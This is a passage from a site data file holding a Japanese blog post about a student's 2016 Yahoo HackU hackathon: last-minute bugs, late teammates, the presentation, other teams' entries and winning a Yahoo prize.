フロントの表示部分に物理演算的なあるんだけどめっちゃバグってる\n- Kinectとの通信を全くテストしてない\n- 発表用のスライドに全く手を付けてない\n\nみたいなカンジでとにかくあたふたしてました。\n\nま、まぁ夜までには†なんとか†なったんですが。\n\nあ、ちなみにボクらのチームでは\n\n- サーバー / クライアント(バックエンド)\n- クライアント(フロントエンド)\n- Kinect\n- UI部品\n\nってカンジで分担してやってました。\n\n今日もラーメンを食べました。六本木は高いお店が多いので庶民的な一蘭はイイですね。8\n\n![](7.jpg)\n\n\n# 発表日 (6/12)\n\n昨日は「家で発表スライド作るぞ！」とか言って帰ったんですが、\n気がついたら時計が **6/12 9:00** とかなってて焦りましたね。\n\nハッカソンは発表が最重要と言っても過言じゃないですし、コレは致命的。\nとりあえず光の速さでスライドを作って六本木に向かいました。\n\nなんかこの日チームメイト3人が各々の用事で遅刻してくるそうで、\nボクが到着した時点で成果発表会が始まる1時間位前（大遅刻です）だったんですけど、\nまわりがワイワイしてるのに、ボクのチームが1人しかいなくて悲しかったです。\n\nというか、ボクのチームだけ発表会直前まで誰も来てなくてヤフーの人が若干イライラしてました。（すみません）\n\n![](8.jpg)\n![](9.jpg)\n\n発表の様子です。[動画](https://www.youtube.com/watch?v=jBqVcu36Yj8&t=1h18m54s)\n\nで、ボクらの作ったものなんですが、[このスライド](https://prezi.com/0-bdffxtth5n/the-future-of-discussion/)を見てもらえればだいたい分かると思います。\n\n![](10.jpg)\n\nこんなの。\n\n## 他のチームの作品を見て\n\nHackU参加チームの過半数が[ウチのサークル](https://trap.jp/tag/hack-u-2016/)だったのもあって、ゲームが多かったですね。\nでも、どれもみんなテーマの「チーム活動に関する何か」を意識していて良いなと感じました。\n\n気がかりだったのが、**ボクらのチームとネタが被ってる作品が他に2つあった**ことです。\nしかも完成度が向こうのほうが明らかに上ときました。八方塞がりです。やべぇよやべぇよ。\n\n音声認識系のプロダクトもほかに数個ありましたし、独創性がアピールしにくかったですね。\n\n## 表彰\n\n↑って状況だったので、うーんってカンジだったんですけど、なんかヤフー賞を頂けました。（びびった）\n\n![](11.jpg)\n\n副賞でTポイントもらいました。やったー。\n\n![](12.jpg)\n\n記念撮影です。\n\n\n# 以上\n\n楽しかった！\n\n技術力も発表力も圧倒的成長できるしHackUって神だな……\n\n来年も是非是非是非是非お願いします！！！！！！！\n","title":"HackUに出た","image":null,"tags":["HackU","ハッカソン","参加記"],"date":"2016-07-11T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://trap.jp/post/53/","publisher":"東京工業大学デジタル創作同好会traP","title":"ハッカソン参加記 - GitLove -","tags":["traP","ハッカソン","参加記"],"date":"2016-05-23T00:00:00.000Z"}]},"__N_SSG":true}